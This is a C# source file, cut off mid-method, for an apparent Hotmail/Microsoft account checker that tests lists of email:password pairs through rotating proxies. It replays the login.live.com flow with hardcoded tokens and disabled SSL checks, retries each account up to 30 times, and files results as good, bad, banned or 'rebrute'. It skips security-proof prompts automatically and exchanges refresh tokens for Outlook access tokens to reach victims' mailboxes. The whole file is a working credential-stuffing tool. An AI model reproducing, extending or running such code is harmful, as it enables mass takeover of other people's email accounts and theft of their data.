using MihaZupan;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Channels;
using System.Threading.Tasks;

namespace EmailParser
{
    public sealed class HotmailProcessor
    {
        private readonly AppSettings _settings;
        private readonly Action<string> _log;
        public string? ResultDir { get; private set; }
        private string? _rebruteHtmlDir;

        private static readonly Regex PpridHtmlRegex = new("name=\"pprid\".*?value=\"([^\"]+)\"",  RegexOptions.Compiled);
        private static readonly Regex PpridJsonRegex = new("\"pprid\":\"([^\"]+)\"",               RegexOptions.Compiled);
        private static readonly Regex IptHtmlRegex   = new("name=\"ipt\".*?value=\"([^\"]+)\"",    RegexOptions.Compiled);
        private static readonly Regex IptJsonRegex   = new("\"ipt\":\"([^\"]+)\"",                 RegexOptions.Compiled);
        private static readonly Regex UaidHtmlRegex  = new("name=\"uaid\".*?value=\"([^\"]+)\"",   RegexOptions.Compiled);
        private static readonly Regex UaidJsonRegex  = new("\"uaid\":\"([^\"]+)\"",                RegexOptions.Compiled);
        private static readonly Regex ActionRegex    = new("action=\"([^\"]+)\"",                  RegexOptions.Compiled);

        public HotmailProcessor(AppSettings settings, Action<string> log)
        {
            _settings = settings;
            _log      = log;
        }

        public async Task RunAsync(CancellationToken ct, Action<ScrapeProgress> reportProgress)
        {
            ct.ThrowIfCancellationRequested();

            var accountsPath = ResolveNearAppOrAbsolute(_settings.HotmailAccountsFile);
            if (!File.Exists(accountsPath))
            {
                var fallback = ResolveNearAppOrAbsolute(_settings.ImapAccountsFile);
                if (File.Exists(fallback))
                    accountsPath = fallback;
                else
                    throw new FileNotFoundException("Hotmail accounts file not found.", accountsPath);
            }

            var resultDir = CreateResultDir();
            ResultDir = resultDir;
            Directory.CreateDirectory(resultDir);

            var rebruteHtmlDir = Path.Combine(resultDir, "rebrute_html");
            _rebruteHtmlDir = rebruteHtmlDir;
            Directory.CreateDirectory(rebruteHtmlDir);

            var accounts = await Task.Run(() => LoadAccounts(accountsPath), ct).ConfigureAwait(false);
            if (accounts.Count == 0)
            {
                _log("No Hotmail accounts found.");
                reportProgress(new ScrapeProgress("No accounts", 0));
                return;
            }

            var proxyPath = string.IsNullOrWhiteSpace(_settings.HotmailProxyFile)
                ? null
                : ResolveNearAppOrAbsolute(_settings.HotmailProxyFile);
            var proxies = proxyPath != null && File.Exists(proxyPath)
                ? await Task.Run(() => LoadProxies(proxyPath, _settings.HotmailProxyProtocol), ct).ConfigureAwait(false)
                : new List<ProxyInfo>();

            _log($"Hotmail: accounts => {accounts.Count}, proxies => {proxies.Count}");

            using var goodWriter     = CreateWriter(Path.Combine(resultDir, "good.txt"));
            using var badWriter      = CreateWriter(Path.Combine(resultDir, "bad.txt"));
            using var bannedWriter   = CreateWriter(Path.Combine(resultDir, "banned.txt"));
            using var rebruteWriter  = CreateWriter(Path.Combine(resultDir, "rebrute.txt"));
            using var notFoundWriter = CreateWriter(Path.Combine(resultDir, "not_found.txt"));
            using var errorWriter    = CreateWriter(Path.Combine(resultDir, "error.txt"));

            var total     = accounts.Count;
            var completed = 0;
            var writeLock = new object();

            var parallelism = Math.Max(1, _settings.MaxParallelHotmailRequests ?? _settings.MaxParallelRequests);
            reportProgress(new ScrapeProgress("Hotmail: starting", 0));

            var channel = Channel.CreateBounded<WorkItem>(new BoundedChannelOptions(parallelism * 4)
            {
                SingleWriter = true,
                SingleReader = false,
                FullMode     = BoundedChannelFullMode.Wait
            });

            var producer = Task.Run(async () =>
            {
                for (var i = 0; i < accounts.Count; i++)
                    await channel.Writer.WriteAsync(new WorkItem(i, accounts[i]), ct).ConfigureAwait(false);
                channel.Writer.TryComplete();
            }, ct);

            var workers = new List<Task>(parallelism);
            for (var w = 0; w < parallelism; w++)
            {
                workers.Add(Task.Run(async () =>
                {
                    while (await channel.Reader.WaitToReadAsync(ct).ConfigureAwait(false))
                    {
                        while (channel.Reader.TryRead(out var item))
                        {
                            var account = item.Account;
                            if (TrySplitAccount(account, out var email, out _))
                                _log($"Hotmail: checking {email}");

                            var result = await AuthenticateAsync(account, proxies, ct).ConfigureAwait(false);

                            lock (writeLock)
                            {
                                WriteResult(result, goodWriter, badWriter, bannedWriter, rebruteWriter, notFoundWriter, errorWriter);
                            }

                            if (TrySplitAccount(account, out var resultEmail, out _))
                                _log($"Hotmail: {resultEmail} => {result.Status}");

                            var done    = Interlocked.Increment(ref completed);
                            var percent = total == 0 ? 0 : (done * 100.0 / total);
                            reportProgress(new ScrapeProgress($"Hotmail: {done}/{total}", percent));
                        }
                    }
                }, ct));
            }

            await Task.WhenAll(workers.Prepend(producer)).ConfigureAwait(false);
            reportProgress(new ScrapeProgress("Hotmail: done", 100));
        }

        private static StreamWriter CreateWriter(string path)
        {
            Directory.CreateDirectory(Path.GetDirectoryName(path) ?? AppContext.BaseDirectory);
            var stream = new FileStream(path, FileMode.Create, FileAccess.Write, FileShare.ReadWrite);
            return new StreamWriter(stream, new UTF8Encoding(false)) { AutoFlush = true };
        }

        private static void WriteResult(HotmailAuthResult result,
            StreamWriter good, StreamWriter bad, StreamWriter banned,
            StreamWriter rebrute, StreamWriter notFound, StreamWriter error)
        {
            var line = result.AccountLine;
            switch (result.Status)
            {
                case HotmailStatus.Good:     good.WriteLine(line);     break;
                case HotmailStatus.Bad:      bad.WriteLine(line);      break;
                case HotmailStatus.Blocked:  banned.WriteLine(line);   break;
                case HotmailStatus.NotFound: notFound.WriteLine(line); break;
                case HotmailStatus.Rebrute:  rebrute.WriteLine(line);  break;
                default:                     error.WriteLine(line);    break;
            }
        }

        private async Task<HotmailAuthResult> AuthenticateAsync(string accountLine, List<ProxyInfo> proxies, CancellationToken ct)
        {
            if (!TrySplitAccount(accountLine, out var email, out var password))
                return new HotmailAuthResult(HotmailStatus.Bad, accountLine);

            var ua = GetUserAgent();
            var blockedTriggers = new[]
            {
                "/Abuse?", "Abuse?mkt", "account.live.com/Abuse", "account.live.com/recover",
                "Email/Confirm?mkt", "identity/confirm?mkt", "Sign in to your Microsoft account",
                "Please retry with a different device", "other authentication method to sign in"
            };

            var attempts  = 30;
            string lastHtml = string.Empty;
            for (var attempt = 0; attempt < attempts; attempt++)
            {
                try
                {
                    var attemptProxy = proxies.Count == 0 ? null : proxies[Random.Shared.Next(proxies.Count)];
                    using var handler = CreateHandler(attemptProxy, useCookies: true, connectTimeout: null, ignoreSsl: true);
                    using var client  = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(25) };

                    var loginUrl =
                        "https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username="
                        + Uri.EscapeDataString(email)
                        + "&contextid=2CCDB02DC526CA71&bk=1665024852&uaid=d9f14b02ec837315bf640792a1e395ff&pid=15216";

                    const string staticCookie = "MSPRequ=id=N&lt=1716447264&co=1; uaid=c3e55b78df926204ce531684a0f283dd; MSPOK=$uuid-7c2f04ab-1938-41d3-b06e-ccfa772e50a3;";
                    const string staticPpft   = "Xk9mRv2NpLqW7dYsZu4FtJhCeA3bGi6O-oMnVcT8wExHlBf5PKIDr1jUgyQS0_aZ%21kR%24xPvLhNqWmCe8dOtYbF3rG7nJiU4sA%21wH6oTMVgKDyBpSfXjE2c1ZuI9lQ0R%24%24";

                    var payload =
                        "ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT="
                        + staticPpft
                        + "&PPSX=Pa&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=1&login="
                        + Uri.EscapeDataString(email)
                        + "&loginfmt="
                        + Uri.EscapeDataString(email)
                        + "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd="
                        + Uri.EscapeDataString(password);

                    using var request = new HttpRequestMessage(HttpMethod.Post, loginUrl);
                    request.Headers.TryAddWithoutValidation("User-Agent", ua);
                    request.Headers.TryAddWithoutValidation("Cookie",     staticCookie);
                    request.Content = new StringContent(payload, Encoding.UTF8, "application/x-www-form-urlencoded");

                    using var response  = await client.SendAsync(request, HttpCompletionOption.ResponseHeadersRead, ct).ConfigureAwait(false);
                    string    htmlText  = await response.Content.ReadAsStringAsync(ct).ConfigureAwait(false) ?? string.Empty;
                    lastHtml    = htmlText;
                    var location    = response.Headers.Location?.ToString() ?? string.Empty;
                    var currentUrl  = response.RequestMessage?.RequestUri?.ToString() ?? string.Empty;

                    string? capturedPuid = null;
                    if (!string.IsNullOrWhiteSpace(location)
                        && location.IndexOf("uid=", StringComparison.OrdinalIgnoreCase) >= 0)
                    {
                        var uidMatch = Regex.Match(location, "uid=([0-9a-fA-F]+)");
                        if (uidMatch.Success)
                            capturedPuid = uidMatch.Groups[1].Value;
                    }

                    var cookiePuid = GetCookieValue(handler.CookieContainer, new Uri("https://login.live.com"), "MSPTokenId");
                    if (!string.IsNullOrWhiteSpace(cookiePuid))
                        capturedPuid = cookiePuid;

                    if (ContainsNotFound(htmlText))
                        return new HotmailAuthResult(HotmailStatus.NotFound, accountLine);
                    if (ContainsBad(htmlText))
                        return new HotmailAuthResult(HotmailStatus.Bad, accountLine);
                    if (ContainsBlocked(htmlText, location, blockedTriggers))
                        return new HotmailAuthResult(HotmailStatus.Blocked, accountLine);

                    var refreshToken = ExtractRefreshToken(currentUrl, htmlText);
                    if (string.IsNullOrWhiteSpace(refreshToken))
                    {
                        var follow = await TryFollowPpridFlow(client, ua, currentUrl, location, htmlText, ct).ConfigureAwait(false);
                        refreshToken = ExtractRefreshToken(follow.location, follow.html);

                        if (ContainsBlocked(follow.html, follow.location, blockedTriggers)
                            || (!string.IsNullOrWhiteSpace(follow.location)
                                && follow.location.IndexOf("/Abuse", StringComparison.OrdinalIgnoreCase) >= 0))
                            return new HotmailAuthResult(HotmailStatus.Blocked, accountLine);

                        htmlText   = follow.html ?? string.Empty;
                        lastHtml   = htmlText;
                        currentUrl = string.IsNullOrWhiteSpace(follow.location) ? currentUrl : follow.location;
                    }

                    if (string.IsNullOrWhiteSpace(refreshToken))
                    {
                        var hasAuthCookie = HasAuthCookie(handler.CookieContainer, new Uri("https://login.live.com"));
                        if (hasAuthCookie || location.IndexOf("rtoken=", StringComparison.OrdinalIgnoreCase) >= 0)
                            currentUrl = location;
                    }

                    if (IsPrivacyNoticeUrl(currentUrl) || IsPrivacyNoticeUrl(location))
                    {
                        var privacyUrl = IsPrivacyNoticeUrl(location) ? location : currentUrl;
                        var privacy    = await HandlePrivacyNoticeAsync(client, ua, privacyUrl, ct).ConfigureAwait(false);
                        if (!string.IsNullOrWhiteSpace(privacy.location)) currentUrl = privacy.location;
                        if (!string.IsNullOrWhiteSpace(privacy.html))     htmlText   = privacy.html;
                    }

                    if (IsProofsUrl(currentUrl) || IsProofsUrl(location))
                    {
                        var proofsUrl = !string.IsNullOrWhiteSpace(location)
                            && location.IndexOf("account.live.com", StringComparison.OrdinalIgnoreCase) >= 0
                                ? location
                                : currentUrl;
                        var proofs = await HandleProofsSkipAsync(client, ua, proofsUrl, ct).ConfigureAwait(false);
                        if (proofs.blocked)
                            return new HotmailAuthResult(HotmailStatus.Blocked, accountLine);
                        if (!string.IsNullOrWhiteSpace(proofs.location)) currentUrl = proofs.location;
                        if (!string.IsNullOrWhiteSpace(proofs.html))     htmlText   = proofs.html;
                    }

                    if (string.IsNullOrWhiteSpace(refreshToken))
                        refreshToken = ExtractRefreshToken(currentUrl, htmlText);

                    if (!string.IsNullOrWhiteSpace(refreshToken))
                    {
                        var accessToken = await ExchangeRefreshTokenAsync(client, ua, refreshToken, ct).ConfigureAwait(false);
                        if (!string.IsNullOrWhiteSpace(accessToken))
                        {
                            var cookieAnchor = GetCookieValue(handler.CookieContainer, new Uri("https://outlook.live.com"), "AnchorMailbox");
                            var anchor       = string.IsNullOrWhiteSpace(cookieAnchor) ? $"SMTP:{email}" : cookieAnchor;
                            var startup      = await GetStartupDataAsync(client, ua, accessToken, anchor, ct).ConfigureAwait(false);
                            var inboxId      = startup.InboxId;
                            var puid         = startup.Puid ?? capturedPuid;

                            if (string.IsNullOrWhiteSpace(inboxId))
                            {
                                var apiIds = await GetIdsViaApiAsync(client, ua, accessToken, anchor, ct).ConfigureAwait(false);
                                inboxId = apiIds.InboxId;
                                puid   ??= apiIds.Puid;
                            }

                            if (!string.IsNullOrWhiteSpace(inboxId))
                                return new HotmailAuthResult(HotmailStatus.Good, accountLine) { AccessToken = accessToken, Puid = puid };

                            return new HotmailAuthResult(HotmailStatus.Error, accountLine);
                        }
                    }

                    return new HotmailAuthResult(HotmailStatus.Error, accountLine);
                }
                catch (OperationCanceledException)
                {
                    throw;
                }
                catch (Exception ex)
                {
                    _log($"Hotmail: {email} error: {ex.Message}");
                }
            }

            SaveRebruteHtml(email, lastHtml);
            return new HotmailAuthResult(HotmailStatus.Rebrute, accountLine);
        }

        private static async Task<(string html, string location)> TryFollowPpridFlow(
            HttpClient client, string ua, string currentUrl, string locationUrl, string html, CancellationToken ct)
        {
            var pprid = ExtractRegexGroup(PpridHtmlRegex, html) ?? ExtractRegexGroup(PpridJsonRegex, html);
            var ipt   = ExtractRegexGroup(IptHtmlRegex,   html) ?? ExtractRegexGroup(IptJsonRegex,   html);
            if (string.IsNullOrWhiteSpace(pprid) || string.IsNullOrWhiteSpace(ipt))
                return (html, locationUrl);

            var uaid      = ExtractRegexGroup(UaidHtmlRegex, html) ?? ExtractRegexGroup(UaidJsonRegex, html) ?? "0";
            var action    = ExtractRegexGroup(ActionRegex,   html);
            var targetUrl = !string.IsNullOrWhiteSpace(action) ? WebUtility.HtmlDecode(action) : locationUrl;
            if (string.IsNullOrWhiteSpace(targetUrl))
                return (html, locationUrl);

            var payload = $"pprid={Uri.EscapeDataString(pprid)}&ipt={Uri.EscapeDataString(ipt)}&uaid={Uri.EscapeDataString(uaid)}";
            using var request = new HttpRequestMessage(HttpMethod.Post, targetUrl);
            request.Headers.TryAddWithoutValidation("User-Agent", ua);
            request.Headers.TryAddWithoutValidation("Referer",    currentUrl);
            request.Content = new StringContent(payload, Encoding.UTF8, "application/x-www-form-urlencoded");
            request.Content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/x-www-form-urlencoded");

            using var response    = await client.SendAsync(request, HttpCompletionOption.ResponseHeadersRead, ct).ConfigureAwait(false);
            var       nextHtml     = await response.Content.ReadAsStringAsync(ct).ConfigureAwait(false);
            var       nextLocation = response.Headers.Location?.ToString()
                ?? response.RequestMessage?.RequestUri?.ToString()
                ?? string.Empty;

            if (!string.IsNullOrWhiteSpace(nextHtml)
                && (nextHtml.IndexOf("security info change is still pending", StringComparison.OrdinalIgnoreCase) >= 0
                    || nextHtml.IndexOf("recoveryCancel", StringComparison.OrdinalIgnoreCase) >= 0))
            {
                var returnUrlMatch = Regex.Match(nextHtml, "\"returnUrl\":\"([^\"]+)\"");
                if (returnUrlMatch.Success)
                {
                    var nextLink = returnUrlMatch.Groups[1].Value.Replace("\\/", "/");
                    using var nextReq  = new HttpRequestMessage(HttpMethod.Get, nextLink);
                    nextReq.Headers.TryAddWithoutValidation("User-Agent", ua);
                    nextReq.Headers.TryAddWithoutValidation("Referer",    currentUrl);
                    using var nextResp = await client.SendAsync(nextReq, HttpCompletionOption.ResponseHeadersRead, ct).ConfigureAwait(false);
                    var loc = nextResp.Headers.Location?.ToString() ?? string.Empty;
                    if (!string.IsNullOrWhiteSpace(loc)
                        && loc.IndexOf("rtoken", StringComparison.OrdinalIgnoreCase) >= 0)
                        return (nextHtml, loc);

                    var fallbackHtml     = await nextResp.Content.ReadAsStringAsync(ct).ConfigureAwait(false);
                    var fallbackLocation = nextResp.Headers.Location?.ToString()
                        ?? nextResp.RequestMessage?.RequestUri?.ToString()
                        ?? string.Empty;
                    return (fallbackHtml, fallbackLocation);
                }
            }

            return (nextHtml, nextLocation);
        }

        private static bool IsPrivacyNoticeUrl(string url)
            => url.IndexOf("privacynotice.account.microsoft.com", StringComparison.OrdinalIgnoreCase) >= 0;

        private static bool IsProofsUrl(string url)
        {
            if (string.IsNullOrWhiteSpace(url)) return false;
            return url.IndexOf("account.live.com/proofs/Add",    StringComparison.OrdinalIgnoreCase) >= 0
                || url.IndexOf("account.live.com/proofs/Verify", StringComparison.OrdinalIgnoreCase) >= 0;
        }

        private static async Task<(string html, string location)> HandlePrivacyNoticeAsync(
            HttpClient client, string ua, string url, CancellationToken ct)
        {
            try
            {
                using var get  = new HttpRequestMessage(HttpMethod.Get, url);
                get.Headers.TryAddWithoutValidation("User-Agent", ua);
                using var resp = await client.SendAsync(get, ct).ConfigureAwait(false);
                var html     = await resp.Content.ReadAsStringAsync(ct).ConfigureAwait(false);
                var finalUrl = resp.RequestMessage?.RequestUri?.ToString() ?? url;

                var noticeId = GetValueFromHtml("NoticeId", html);
                var userId   = GetValueFromHtml("UserId",   html);
                if (string.IsNullOrWhiteSpace(noticeId) || string.IsNullOrWhiteSpace(userId))
                    return (html, resp.Headers.Location?.ToString() ?? string.Empty);

                var fields = new Dictionary<string, string?>
                {
                    { "ClientId",                 GetValueFromHtml("ClientId",                html) },
                    { "ConsentSurface",            GetValueFromHtml("ConsentSurface",          html) ?? "SISU" },
                    { "ConsentType",              GetValueFromHtml("ConsentType",              html) ?? "ucsisunotice" },
                    { "correlation_id",            GetValueFromHtml("correlation_id",          html) },
                    { "CountryRegion",             GetValueFromHtml("CountryRegion",           html) ?? "UK" },
                    { "DeviceId",                  GetValueFromHtml("DeviceId",                html) },
                    { "SerializedEncryptionData",  WebUtility.HtmlDecode(GetValueFromHtml("SerializedEncryptionData", html) ?? string.Empty) },
                    { "FormFactor",               "Mobile" },
                    { "Market",                    GetValueFromHtml("Market",      html) ?? "RU-RU" },
                    { "ModelType",                 GetValueFromHtml("ModelType",   html) ?? "ucsisunotice" },
                    { "ModelVersion",              GetValueFromHtml("ModelVersion",html) ?? "1.14" },
                    { "NoticeId",                  noticeId },
                    { "Platform",                 "Windows" },
                    { "UserId",                    userId },
                    { "UserVersion",              "1" }
                };

                var form = new MultipartFormDataContent();
                foreach (var kv in fields.Where(kv => !string.IsNullOrWhiteSpace(kv.Value)))
                    form.Add(new StringContent(kv.Value ?? string.Empty), kv.Key);

                const string recordUrl = "https://privacynotice.account.microsoft.com/recordnotice";
                using var post     = new HttpRequestMessage(HttpMethod.Post, recordUrl);
                post.Headers.TryAddWithoutValidation("User-Agent", ua);
                post.Headers.TryAddWithoutValidation("Referer",    finalUrl);
                post.Content = form;

                using var postResp = await client.SendAsync(post, ct).ConfigureAwait(false);
                var body = await postResp.Content.ReadAsStringAsync(ct).ConfigureAwait(false);
                var next = postResp.Headers.Location?.ToString();
                if (string.IsNullOrWhiteSpace(next))
                {
                    var match = Regex.Match(body ?? string.Empty, "var redirectUrl = '([^']+)'");
                    if (match.Success) next = WebUtility.UrlDecode(match.Groups[1].Value);
                }
                if (string.IsNullOrWhiteSpace(next))
                {
                    var ru = Regex.Match(finalUrl, "[?&]ru=([^&]+)");
                    if (ru.Success) next = WebUtility.UrlDecode(ru.Groups[1].Value);
                }

                if (!string.IsNullOrWhiteSpace(next))
                {
                    using var fin     = new HttpRequestMessage(HttpMethod.Get, next);
                    fin.Headers.TryAddWithoutValidation("User-Agent", ua);
                    using var finResp = await client.SendAsync(fin, ct).ConfigureAwait(false);
                    var finHtml = await finResp.Content.ReadAsStringAsync(ct).ConfigureAwait(false);
                    var loc     = finResp.Headers.Location?.ToString()
                        ?? finResp.RequestMessage?.RequestUri?.ToString()
                        ?? next;
                    return (finHtml ?? string.Empty, loc);
                }

                return (body ?? string.Empty, postResp.Headers.Location?.ToString() ?? string.Empty);
            }
            catch
            {
                return (string.Empty, string.Empty);
            }
        }

        private static async Task<(string html, string location, bool blocked)> HandleProofsSkipAsync(
            HttpClient client, string ua, string url, CancellationToken ct)
        {
            try
            {
                using var get  = new HttpRequestMessage(HttpMethod.Get, url);
                get.Headers.TryAddWithoutValidation("User-Agent", ua);
                using var resp = await client.SendAsync(get, ct).ConfigureAwait(false);
                var html     = await resp.Content.ReadAsStringAsync(ct).ConfigureAwait(false);
                var proofUrl = resp.RequestMessage?.RequestUri?.ToString() ?? url;

                var htmlText    = html ?? string.Empty;
                var canaryMatch = Regex.Match(htmlText, "name=\"canary\"[^>]*value=\"([^\"]+)\"");
                var hasSkip     = htmlText.IndexOf("action=Skip",          StringComparison.OrdinalIgnoreCase) >= 0
                               || htmlText.IndexOf("iPcSkip",              StringComparison.OrdinalIgnoreCase) >= 0
                               || htmlText.IndexOf("value=\"Skip\"",       StringComparison.OrdinalIgnoreCase) >= 0
                               || htmlText.IndexOf("value=\"\u041f\u043e\u0437\u0436\u0435\"", StringComparison.OrdinalIgnoreCase) >= 0;

                if (!canaryMatch.Success || !hasSkip)
                    return (htmlText, resp.Headers.Location?.ToString() ?? proofUrl, true);

                var proofOptionsMatch = Regex.Match(htmlText, "name=\"iProofOptions\"\\s+value=\"([^\"]+)\"");
                var proofOptions = proofOptionsMatch.Success ? proofOptionsMatch.Groups[1].Value : "OTT||765965880||SMS||0||80";
                var canary       = canaryMatch.Groups[1].Value;
                var payload      = new Dictionary<string, string>
                {
                    { "iProofOptions", proofOptions },
                    { "iOttText",      string.Empty },
                    { "canary",        canary },
                    { "action",        "Skip" }
                };

                using var post = new HttpRequestMessage(HttpMethod.Post, proofUrl);
                post.Headers.TryAddWithoutValidation("User-Agent", ua);
                post.Headers.TryAddWithoutValidation("Referer",    proofUrl);
                post.Content = new FormUrlEncodedContent(payload);
                post.Content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/x-www-form-urlencoded");

                using var postResp = await client.SendAsync(post, ct).ConfigureAwait(false);
                var postHtml = await postResp.Content.ReadAsStringAsync(ct).ConfigureAwait(false);
                var loc      = postResp.Headers.Location?.ToString()
                    ?? postResp.RequestMessage?.RequestUri?.ToString()
                    ?? string.Empty;
                return (postHtml, loc, false);
            }
            catch
            {
                return (string.Empty, string.Empty, false);
            }
        }

        private static async Task<string?> ExchangeRefreshTokenAsync(
            HttpClient client, string ua, string refreshToken, CancellationToken ct)
        {
            const string url =
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/token?client-request-id=fb6486eb-6390-2867-95c9-e17f1ad1b10c";
            var payload =
                "client_id=0000000048170EF3&redirect_uri=https%3A%2F%2Foutlook.live.com%2Fmail%2FoauthRedirect.html&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL%20openid%20profile%20offline_access&grant_type=refresh_token&client_info=1&x-client-SKU=msal.js.browser&x-client-VER=4.26.0&refresh_token="
                + Uri.EscapeDataString(refreshToken)
                + "&claims=%7B%22access_token%22%3A%7B%22xms_cc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D&X-AnchorMailbox=Oid%3A00000000-0000-0000-178d-0eb9e25b5878%409188040d-6c67-4c5b-b112-36a304b66dad";

            using var request = new HttpRequestMessage(HttpMethod.Post, url);
            request.Headers.TryAddWithoutValidation("User-Agent", ua);
            request.Headers.TryAddWithoutValidation("Origin",     "https://outlook.live.com");
            request.Content = new StringContent(payload, Encoding.UTF8, "application/x-www-form-urlencoded");

            using var response = await client.SendAsync(request, ct).ConfigureAwait(false);
            var txt = await response.Content.ReadAsStringAsync(ct).ConfigureAwait(false);
            return FindBetween(txt, "accessToken\":\"", "\"");
        }

        private async Task<StartupDataResult> GetStartupDataAsync(
            HttpClient client, string ua, string accessToken, string anchor, CancellationToken ct)
        {
            const string url = "https://outlook.live.com/owa/0/startupdata.ashx?app=Mail&n=0";

            using var request = new HttpRequestMessage(HttpMethod.Post, url);
            request.Headers.TryAddWithoutValidation("User-Agent",      ua);
            request.Headers.TryAddWithoutValidation("Authorization",   $"MSAuth2.0 usertoken=\"{accessToken}\", type=\"MSACT\"");
            request.Headers.TryAddWithoutValidation("Content-Type",    "application/x-www-form-urlencoded");
            request.Headers.TryAddWithoutValidation("x-anchormailbox", anchor);
            request.Headers.TryAddWithoutValidation("Accept-Language", "en-US,en;q=0.9");
            request.Content = new StringContent(string.Empty, Encoding.UTF8, "application/x-www-form-urlencoded");

            using var response = await client.SendAsync(request, ct).ConfigureAwait(false);
            var text = await response.Content.ReadAsStringAsync(ct).ConfigureAwait(false);

            var needInit = response.StatusCode == HttpStatusCode.NoContent
                || (response.Headers.TryGetValues("X-OWA-Error", out var err)
                    && err.Any(e => e.Contains("OwaInvalidUserLanguageException", StringComparison.OrdinalIgnoreCase)));

            if (needInit)
            {
                var initOk = await InitializeMailboxAsync(client, ua, accessToken, anchor, ct).ConfigureAwait(false);
                if (initOk)
                {
                    using var retry = new HttpRequestMessage(HttpMethod.Post, url);
                    retry.Headers.TryAddWithoutValidation("User-Agent",      ua);
                    retry.Headers.TryAddWithoutValidation("Authorization",   $"MSAuth2.0 usertoken=\"{accessToken}\", type=\"MSACT\"");
                    retry.Headers.TryAddWithoutValidation("Content-Type",    "application/x-www-form-urlencoded");
                    retry.Headers.TryAddWithoutValidation("x-anchormailbox", anchor);
                    retry.Headers.TryAddWithoutValidation("Accept-Language", "en-US,en;q=0.9");
                    retry.Content = new StringContent(string.Empty, Encoding.UTF8, "application/x-www-form-urlencoded");
                    using var retryResp = await client.SendAsync(retry, ct).ConfigureAwait(false);
                    text = await retryResp.Content.ReadAsStringAsync(ct).ConfigureAwait(false);
                }
            }

            if (string.IsNullOrWhiteSpace(text))
                return StartupDataResult.Empty;

            try
            {
                using var doc = JsonDocument.Parse(text);
                var inboxId  = FindFolderIdRecursive(doc.RootElement, "inbox");
                var sentId   = FindFolderIdRecursive(doc.RootElement, "sentitems");
                var draftsId = FindFolderIdRecursive(doc.RootElement, "drafts");
                var puid     = FindPuidRecursive(doc.RootElement) ?? FindBetween(text, "\"UserPuid\":\"", "\"");
                return new StartupDataResult(true, inboxId, sentId, draftsId, puid);
            }
            catch
            {
                return StartupDataResult.Empty;
            }
        }

        private static async Task<bool> InitializeMailboxAsync(
            HttpClient client, string ua, string accessToken, string anchor, CancellationToken ct)
        {
            const string url = "https://outlook.live.com/owa/service.svc?action=UpdateUserConfiguration&app=Mail&n=88";
            var payload = new
            {
                __type = "UpdateUserConfigurationJsonRequest:#Exchange",
                Header = new { __type = "JsonRequestHeaders:#Exchange", RequestServerVersion = "V2018_01_08" },
                Body = new
                {
                    __type = "UpdateUserConfigurationRequest:#Exchange",
                    UserConfiguration = new
                    {
                        __type = "UserConfiguration:#Exchange",
                        UserOptions = new
                        {
                            __type = "UserOptions:#Exchange",
                            Timezone = "UTC",
                            UserLanguages = new[] { "en-US" },
                            MailboxLayout = "Mouse",
                            GlobalHasAttachments = false
                        }
                    }
                }
            };

            var json = JsonSerializer.Serialize(payload);
            using var request = new HttpRequestMessage(HttpMethod.Post, url);
            request.Headers.TryAddWithoutValidation("User-Agent",      ua);
            request.Headers.TryAddWithoutValidation("Authorization",   $"MSAuth2.0 usertoken=\"{accessToken}\", type=\"MSACT\"");
            request.Headers.TryAddWithoutValidation("x-anchormailbox", anchor);
            request.Headers.TryAddWithoutValidation("x-req-source",    "Mail");
            request.Headers.TryAddWithoutValidation("Content-Type",    "application/json");
            request.Headers.TryAddWithoutValidation("x-owa-hosted-ux", "false");
            request.Headers.TryAddWithoutValidation("Accept-Language", "en-US,en;q=0.9");
            request.Content = new StringContent(json, Encoding.UTF8, "application/json");

            using var response = await client.SendAsync(request, ct).ConfigureAwait(false);
            return response.IsSuccessStatusCode;
        }

        private static async Task<StartupDataResult> GetIdsViaApiAsync(
            HttpClient client, string ua, string accessToken, string anchor, CancellationToken ct)
        {
            const string url = "https://outlook.live.com/owa/service.svc?action=GetFolder&app=Mail&n=55";
            var basePayload = new
            {
                __type = "GetFolderJsonRequest:#Exchange",
                Header = new { __type = "JsonRequestHeaders:#Exchange", RequestServerVersion = "V2018_01_08" },
                Body   = new
                {
                    __type = "GetFolderRequest:#Exchange",
                    FolderShape             = new { __type = "FolderResponseShape:#Exchange", BaseShape = "IdOnly" },
                    DistinguishedFolderIds  = Array.Empty<object>()
                }
            };

            async Task<string?> TryGetFolderAsync(string distId)
            {
                var payload = new
                {
                    basePayload.__type,
                    basePayload.Header,
                    Body = new
                    {
                        basePayload.Body.__type,
                        basePayload.Body.FolderShape,
                        DistinguishedFolderIds = new[] { new { __type = "DistinguishedFolderId:#Exchange", Id = distId } }
                    }
                };

                var json = JsonSerializer.Serialize(payload);
                using var request = new HttpRequestMessage(HttpMethod.Post, url);
                request.Headers.TryAddWithoutValidation("User-Agent",      ua);
                request.Headers.TryAddWithoutValidation("Authorization",   $"MSAuth2.0 usertoken=\"{accessToken}\", type=\"MSACT\"");
                request.Headers.TryAddWithoutValidation("x-req-source",    "Mail");
                request.Headers.TryAddWithoutValidation("x-owa-hosted-ux", "false");
                request.Headers.TryAddWithoutValidation("x-anchormailbox", anchor);
                request.Headers.TryAddWithoutValidation("Content-Type",    "application/json");
                request.Headers.TryAddWithoutValidation("x-owa-urlpostdata", Uri.EscapeDataString(json));
                request.Headers.TryAddWithoutValidation("Accept-Language", "en-US,en;q=0.9");
                request.Content = new StringContent(json, Encoding.UTF8, "application/json");

                try
                {
                    using var response = await client.SendAsync(request, ct).ConfigureAwait(false);
                    if (!response.IsSuccessStatusCode) return null;
                    var text = await response.Content.ReadAsStringAsync(ct).ConfigureAwait(false);
                    using var doc   = JsonDocument.Parse(text);
                    var items = doc.RootElement.GetProperty("Body").GetProperty("ResponseMessages").GetProperty("Items");
